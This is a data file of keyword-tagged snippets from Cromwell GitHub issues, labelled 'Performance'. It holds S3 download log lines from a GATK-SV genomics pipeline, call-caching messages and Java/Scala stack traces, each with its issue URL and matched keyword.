s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:76120,cache,cacheCopy,76120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-143/cacheCopy/SR00c.NA20321.txt.gz.tbi; 1608597415362,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-12/cacheCopy/SR00c.HG00410.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-12/cacheCopy/SR00c.HG00410.txt.gz.tbi; 1608597418094,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz; 1608597419738,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-1/cacheCopy/SR00c.HG00096.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:130372,cache,cacheCopy,130372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz.tbi; 1608597489587,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz.tbi; 1608597491461,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz.tbi; 1608597492748,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:152805,cache,cacheCopy,152805,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz.tbi; 1608597053171,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz.tbi; 1608597054920,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz.tbi; 1608597057531,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4ea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:31877,cache,cacheCopy,31877,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-154/cacheCopy/SR00c.NA21102.txt.gz.tbi; 1608597243204,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-14/cacheCopy/SR00c.HG00557.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-14/cacheCopy/SR00c.HG00557.txt.gz.tbi; 1608597245149,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-144/cacheCopy/SR00c.NA20346.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-144/cacheCopy/SR00c.NA20346.txt.gz; 1608597247776,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-88/cacheCopy/SR00c.HG03694.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:83597,cache,cacheCopy,83597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-58/cacheCopy/SR00c.HG02367.txt.gz.tbi; 1608597120193,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-147/cacheCopy/SR00c.NA20522.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-147/cacheCopy/SR00c.NA20522.txt.gz.tbi; 1608597122029,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz.tbi; 1608597125075,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:50578,cache,cacheCopy,50578,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz.tbi; 1608597545740,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi; 1608597548876,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz; 1608597550096,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:169914,cache,cacheCopy,169914,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-MergeSRFilesByContig/shard-5/write_lines_1aa3abac483dac7d55fbf1572054f418.tmp; 1608597648902,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-58/cacheCopy/SR00c.HG02367.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-58/cacheCopy/SR00c.HG02367.txt.gz; 1608597650698,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz; 1608597651470,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:196717,cache,cacheCopy,196717,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6de7fff-EngineJobExecutionActor-main.assessment_ages:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:50,48] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.assessment_ages' (scatter index: None, attempt 1); [2022-12-15 21:27:50,82] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.genetic_sex:-1:1-20000000011 [9e4f5894main.genetic_sex:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:27:50,82] [info] BT-322 9e4f5894:main.genetic_sex:-1:1 cache hit copying success with aggregated hashes: initial = FD7DC79B974CF6706FC3376F067965B9, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:50,82] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.genetic_sex:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:54,15] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.genetic_sex' (scatter index: None, attempt 1); [2022-12-15 21:27:55,79] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.categorical_covariates:0:1-20000000027 [9e4f5894main.categorical_covariates:0:1]: Unrecognized runtime attribute keys: dx_t; imeout; [2022-12-15 21:27:55,79] [info] BT-322 9e4f5894:main.categorical_covariates:0:1 cache hit copying success with aggregated hashes: initial = C760DC2B9015D0B787EF7BEE7D21AA58, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.categorical_covariates:0:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:55,79] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.pcs:-1:1-20000000010 [9e4f5894main.pcs",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:29899,cache,cache,29899,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,"7); 	at slick.jdbc.JdbcBackend$BaseSession.withPreparedStatement(JdbcBackend.scala:434); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl.preparedInsert(JdbcActionComponent.scala:502); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.run(JdbcActionComponent.scala:527); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:31); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:28); 	at slick.dbio.DBIOAction$$anon$4.$anonfun$run$3(DBIOAction.scala:240); 	at slick.dbio.DBIOAction$$anon$4$$Lambda$1952/113291290.apply(Unknown Source); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); [2018-03-09 15:56:36,88] [warn] Localhost hostname lookup failed, keeping the value 'unavailable'; java.util.concurrent.TimeoutException: null; 	at java.util.concurrent.FutureTask.get(FutureTask.java:205); 	at com.getsentry.raven.event.EventBuilder$HostnameCache.updateCache(EventBuilder.java:491); 	at com.getsentry.raven.event.EventBuilder$HostnameCache.getHostname(EventBuilder.java:477); 	at com.getsentry.raven.event.EventBuilder.autoSetMissingValues(EventBuilder.java:97); 	at com.getsentry.raven.event.EventBuilder.build(EventBuilder.java:410); 	at com.getsentry.raven.logback.SentryAppender.buildEvent(SentryAppender.java:324); 	at com.getsentry.raven.logback.SentryAppender.append(SentryAppender.java:230); 	at com.getsentry.raven.logback.SentryAppender.append(SentryAppender.java:37); 	at ch.qos.logback.core.AppenderBase.doAppend(AppenderBase.java:82); 	at ch.qos.logback.core.spi.AppenderAttachableImpl.appendLoopOnAppenders(AppenderAttachableImpl.java:51); 	at ch.qos.logback.classic.Logger.appendLoopOnAppenders(Logger.java:270); 	at ch.qos.logback.classic.Logger.callAppenders(Logger.java:257); 	at ch.qos.logback.classic.Logger.buildLoggingEventAnd",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387:17936,concurren,concurrent,17936,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387,1,['concurren'],['concurrent']
Performance,7); languages.wdl.draft3.WdlDraft3LanguageFactory.getWomBundle(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:128); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); akka.dispatch.forkjoin.ForkJoinW,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:9342,concurren,concurrent,9342,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['concurren'],['concurrent']
Performance,7); languages.wdl.draft3.WdlDraft3LanguageFactory.getWomBundle(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:138); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); akka.dispatch.forkjoin.ForkJoinW,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6999:12166,concurren,concurrent,12166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6999,1,['concurren'],['concurrent']
